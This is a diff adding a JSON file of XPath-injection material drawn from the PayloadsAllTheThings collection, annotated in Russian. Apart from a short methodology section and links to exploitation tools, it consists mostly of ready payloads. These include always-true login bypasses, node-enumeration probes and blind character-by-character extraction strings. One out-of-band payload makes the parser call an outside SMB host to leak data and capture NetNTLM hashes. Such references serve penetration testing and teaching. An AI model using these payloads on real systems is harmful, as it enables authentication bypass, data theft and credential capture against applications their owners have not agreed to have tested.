@@ -1,0 +1,76 @@
+{
+  "category": "XPATH Injection",
+  "source": "PayloadsAllTheThings/XPATH Injection/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Что такое XPath-инъекция и где искать",
+      "language": "text",
+      "tags": ["methodology", "xpath", "recon"],
+      "body": "XPath-инъекция возникает, когда пользовательский ввод подставляется в XPath-запрос (язык навигации по XML) без экранирования. Атакующий ломает синтаксис запроса своими кавычками и операторами, меняя логику выборки по XML-документу.\n\nГде искать:\n• Формы логина, где учётки хранятся в XML, а не в БД — типовая цель обхода аутентификации.\n• Поиск/фильтры, которые превращаются в запрос к XML (каталоги, конфиги, прайсы).\n• Любой ввод, который попадает в выражение вида //user[name/text()='ВВОД'].\n\nИдея эксплуатации: как и в SQL-инъекции, нужно корректно «завершить» запрос своей кавычкой, затем дописать always-true условие (обход аутентификации) либо посимвольно вытащить данные через substring (blind)."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Контекст уязвимого запроса (как формируется XPath)",
+      "language": "text",
+      "tags": ["methodology", "xpath", "context"],
+      "body": "Пример небезопасной конкатенации XPath из пользовательского ввода (vuln_var1):\n\nstring(//user[name/text()='\" +vuln_var1+ \"' and password/text()='\" +vuln_var1+ \"']/account/text())\n\nВвод подставляется прямо внутрь кавычек name/text()='...' — поэтому payload начинается с ' чтобы закрыть строку и продолжить выражение."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Инструменты для эксплуатации XPath-инъекции",
+      "language": "text",
+      "tags": ["tools", "automation"],
+      "body": "• orf/xcat — автоматизация XPath-инъекций для извлечения документов: https://github.com/orf/xcat\n• feakk/xxxpwn — продвинутый инструмент XPath-инъекций: https://github.com/feakk/xxxpwn\n• aayla-secura/xxxpwn_smart — форк xxxpwn с предиктивным вводом: https://github.com/aayla-secura/xxxpwn_smart\n• micsoftvn/xpath-blind-explorer: https://github.com/micsoftvn/xpath-blind-explorer\n• Harshal35/XmlChor — инструмент эксплуатации XPath-инъекции: https://github.com/Harshal35/XMLCHOR"
+    },
+    {
+      "subcategory": "Обход аутентификации",
+      "title": "Тавтологии для обхода логина (always-true)",
+      "language": "text",
+      "tags": ["auth-bypass", "tautology"],
+      "body": "' or '1'='1\n' or ''='\nx' or 1=1 or 'x'='y"
+    },
+    {
+      "subcategory": "Извлечение структуры",
+      "title": "Селекторы узлов для обхода XML-дерева",
+      "language": "text",
+      "tags": ["structure", "enumeration", "nodes"],
+      "body": "/\n//\n//*\n*/*\n@*\ncount(/child::node())"
+    },
+    {
+      "subcategory": "Извлечение структуры",
+      "title": "Проверка имени узла и подсчёт элементов",
+      "language": "text",
+      "tags": ["structure", "enumeration", "count"],
+      "body": "x' or name()='username' or 'x'='y\n' and count(/*)=1 and '1'='1\n' and count(/@*)=1 and '1'='1\n' and count(/comment())=1 and '1'='1"
+    },
+    {
+      "subcategory": "Извлечение структуры",
+      "title": "Извлечение соседних узлов и проверка password",
+      "language": "text",
+      "tags": ["structure", "extraction", "password"],
+      "body": "')] | //user/*[contains(*,'\n') and contains(../password,'c\n') and starts-with(../password,'c"
+    },
+    {
+      "subcategory": "Blind-эксплуатация",
+      "title": "Длина строки (string-length)",
+      "language": "text",
+      "tags": ["blind", "boolean-based", "string-length"],
+      "body": "Подбирай SIZE_INT, пока условие не станет истинным — так узнаёшь длину значения:\n\nand string-length(account)=SIZE_INT"
+    },
+    {
+      "subcategory": "Blind-эксплуатация",
+      "title": "Посимвольная экстракция (substring)",
+      "language": "text",
+      "tags": ["blind", "boolean-based", "substring"],
+      "body": "Доступ к символу по позиции через substring; значение проверяется напрямую или через codepoints-to-string (по ORD-коду символа):\n\nsubstring(//user[userid=5]/username,2,1)=CHAR_HERE\nsubstring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)"
+    },
+    {
+      "subcategory": "Out-of-Band эксфильтрация",
+      "title": "Утечка через doc() (UNC / SMB)",
+      "language": "text",
+      "tags": ["oob", "exfiltration", "doc"],
+      "body": "Функция doc() заставляет парсер обратиться к внешнему ресурсу — пригодно для OOB-подтверждения и кражи NetNTLM-хэша через UNC-путь:\n\nhttp://example.com/?title=Foundation&type=*&rent_days=* and doc('//10.10.10.10/SHARE')"
+    }
+  ]
+}
